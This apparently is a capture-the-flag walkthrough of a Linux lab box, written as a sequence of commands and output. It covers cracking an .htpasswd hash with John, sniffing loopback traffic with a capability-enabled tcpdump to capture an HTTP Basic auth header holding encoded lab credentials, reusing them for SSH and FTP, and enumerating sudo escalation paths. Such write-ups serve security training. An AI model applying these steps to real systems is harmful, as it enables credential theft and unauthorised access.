+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/home/simeon/.viminfo
+/root/
+/var/www
+/var/www/cgi-bin
+/var/www/html
+<strong>/var/www/html/test-auth
+/var/www/html/test-auth/.htpasswd
+/var/www/html/test-auth/index.html</strong>
+/var/www/html/simeon
+/var/www/html/simeon/style.css
+/var/www/html/simeon/chapter1.html
+/var/www/html/simeon/chapter2.html
+/var/www/html/simeon/chapter3.html
+/var/www/html/simeon/chapter4.html
+/var/www/html/simeon/chapter5.html
+/var/www/html/simeon/chapter6.html
+/var/www/html/simeon/chapter7.html
+/var/www/html/simeon/chapter8.html
+/var/www/html/simeon/chapter9.html
+/var/www/html/simeon/index.html
+
+> what is <strong><em>test-auth</em></strong> ?
+
+<strong>ls -la</strong>
+total 8
+drwxr-xr-x. 2 root root  41 Nov 23  2021 .
+drwxr-xr-x. 4 root root  37 Jan 25  2022 ..
+-rw-r--<strong>r</strong>--. 1 root root  47 Nov 23  2021 .htpasswd
+-rw-r--<strong>r</strong>--. 1 root root 109 Nov 23  2021 index.html
+
+> We have read rights, let's check out
+
+<strong>cat .htpasswd</strong>
+theodore:$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1
+
+> Hello Hash-Value, what are you?
+```
+
+
+
+
+
+```
+$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1 -
+Possible algorithms: <strong>Apache $apr1$ MD5</strong>, md5apr1, MD5 (APR)
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### CRACK WITH JOHN THE RIPPER
+
+
+
+
+
+```
+<strong>john theodore.hash --wordlist=/usr/share/wordlists/rockyou.txt</strong>
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 20 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+redacted      (?)
+1g 0:00:00:00 DONE (2023-08-05 01:32) 2.000g/s 138240p/s 138240c/s 138240C/s 052406..45454
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+
+
+
+
+> **RABBIT HOLE INCOMING**
+>
+> nice trap
+
+
+
+
+
+---
+
+
+
+
+
+```
+> Let's use the next PE vector from linPEAS
+<strong>
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip</strong>
+
+You can sniff with tcpdump!
+
+> Let's listen the loopback interface (<strong>-i lo</strong>)
+> We want to read so give the output in ASCII format (<strong>-A</strong>)
+
+<strong>tcpdump -i lo -A</strong>
+```
+
+
+
+
+
+```
+02:10:01.741317 IP localhost > localhost: ICMP echo request, id 3010, seq 1, length 64
+E..T.l@.@..:..........Y"....Y..d.....O...................... !"#$%&'()*+,-./01234567
+02:10:01.741335 IP localhost > localhost: ICMP echo reply, id 3010, seq 1, length 64
+E..T.m..@..9..........a"....Y..d.....O...................... !"#$%&'()*+,-./01234567
+02:10:01.912587 IP localhost.49208 > localhost.http: Flags [S], seq 1206061769, win 43690, options [mss 65495,sackOK,TS val 15742782 ecr 0,nop,wscale 7], length 0
+E..<=.@.@............8.PG.
+..........0.........
+..7>........
+02:10:01.912612 IP localhost.http > localhost.49208: Flags [S.], seq 3620011959, ack 1206061770, win 43690, options [mss 65495,sackOK,TS val 15742782 ecr 15742782,nop,wscale 7], length 0
+E..<..@.@.<..........P.8....G.
+......0.........
+..7>..7>....
+02:10:01.912628 IP localhost.49208 > localhost.http: Flags [.], ack 1, win 342, options [nop,nop,TS val 15742782 ecr 15742782], length 0
+E..4=.@.@............8.PG.
+........V.(.....
+..7>..7>
+02:10:01.912898 IP localhost.49208 > localhost.http: Flags [P.], seq 1:224, ack 1, win 342, options [nop,nop,TS val 15742783 ecr 15742782], length 223: HTTP: GET /test-auth/index.html HTTP/1.1
+E...=.@.@............8.PG.
+........V.......
+..7?..7><strong>GET /test-auth/index.html</strong> HTTP/1.1
+Host: 127.0.0.1
+User-Agent: python-requests/2.14.2
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+<strong>Authorization: Basic</strong> <strong><em>dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=</em></strong>
+```
+
+
+
+
+
+```
+> Could this be a password ?
+> Let's decrypte the Base64 with <a rel="noreferrer noopener" href="https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=ZEdobGIyUnZjbVU2VW1scWVXRnpkMkZvWldKalpXbGlZWEpxYVdzPQ" target="_blank"><strong>CyberChef.io</strong></a>
+
+> Let's try SSH Login
+   - <strong><em>Success !</em></strong>
+
+> Let's try SMB Login
+  - Failed
+
+> Let's try FTP Login
+  - <strong><em>Success !</em></strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+ftp> <strong>ls -la</strong>
+
+229 Entering Extended Passive Mode (|||6768|).
+150 Here comes the directory listing.
+drwx------    5 1001     1001          158 Mar 25  2022 .
+drwxr-xr-x    5 0        0              54 Nov 23  2021 ..
+drwx------    4 1001     1001           27 Nov 24  2021 .ansible
+lrwxrwxrwx    1 0        0               9 Nov 23  2021 .bash_history -> /dev/null
+-rw-r--r--    1 1001     1001           18 Apr 01  2020 .bash_logout
+-rw-r--r--    1 1001     1001          193 Apr 01  2020 .bash_profile
+-rw-r--r--    1 1001     1001          231 Apr 01  2020 .bashrc
+drwx------    2 1001     1001            6 Nov 24  2021 .ssh
+lrwxrwxrwx    1 0        0               9 Mar 25  2022 .viminfo -> /dev/null
+drwxr-xr-x    2 1001     1001           30 Mar 25  2022 scripts
+-r--------    1 1001     1001           38 Nov 23  2021 <strong>user.txt</strong>
+```
+
+
+
+
+
+```
+> Download everything from the FTP
+
+<strong>wget -m ftp://theodore:HERE-COMES-THE-PASSWORD@10.10.130.167</strong>
+
+<strong><em>> We got flag number 1 / user.txt</em></strong>
+
+> We got a <em>test-www-auth.py</em> which is the scirpt
+```
+
+
+
+
+
+##### IMPORTANT - NOTE !
+
+
+
+
+
+```
+> With wget -m ftp <strong>you only get the visible files</strong> all hidden files aren't copied !
+
+> So back to the ftp
+
+ftp> <strong>cd .ansible</strong>
+250 Directory successfully changed.
+
+ftp> <strong>ls -la</strong>
+229 Entering Extended Passive Mode (|||23992|).
+150 Here comes the directory listing.
+drwx------    4 1001     1001           27 Nov 24  2021 .
+drwx------    5 1001     1001          158 Mar 25  2022 ..
+drwx------    2 1001     1001            6 Nov 24  2021 <strong>cp</strong>
+drwx------    2 1001     1001            6 Nov 24  2021 <strong>tmp</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### CREDENTIAL ACCESS
+
+
+
+
+
+##### linPEAS WITH theodore
+
+
+
+
+
+```
+<strong>ssh theodore@10.10.130.167</strong>
+<strong>cd /tmp</strong>
+<strong>./linpeas.sh</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+#### WEAPONIZATION
+
+
+
+
+
+```
+> Results from linPEAS
+
+User theodore may run the following commands on aratus:
+    (automation) NOPASSWD: <strong>/opt/scripts/infra_as_code.sh</strong>
+
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
+<strong>ptrace protection is disabled (0), so sudo tokens could be abused</strong>
+
+/opt/ansible/README.txt
+```
+
+
